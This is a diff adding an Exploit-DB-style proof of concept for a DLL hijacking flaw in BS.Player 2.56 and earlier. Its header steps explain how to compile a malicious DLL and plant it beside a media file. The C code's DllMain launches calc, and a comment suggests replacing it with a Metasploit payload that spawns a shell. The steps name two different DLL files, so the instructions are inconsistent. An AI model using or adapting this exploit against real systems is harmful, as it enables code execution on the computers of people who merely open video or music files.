@@ -1,0 +1,31 @@
+# Exploit Title: BS.Player DLL Hijacking Exploit (mfc71loc.dll)
+# Date: 25/08/2010
+# Author: Bruno Filipe (diwr) http://digitalacropolis.us
+# Software Link: http://www.bsplayer.org
+# Version: <= 2.56 build 1043
+# Tested on: WinXP SP2, WinXP SP3
+# Thx TheLeader ;)
+#
+----------------------------------------------------------------------------------------------------------
+# This should work with any file handled by BS.Player (videos and music)
+# 1. gcc dllmain.c -o mfc71loc.dll
+# 2. Put mfc71ptb.dll in the same directory of a media file (EG:
+anything.avi)
+# 3. You can generate a msfpayload DLL and spawn a shell, for example.
+#
+----------------------------------------------------------------------------------------------------------
+
+#include <windows.h>
+
+int main()
+{
+  WinExec("calc", SW_NORMAL);
+  exit(0);
+  return 0;
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
+{
+  main();
+  return 0;
+}
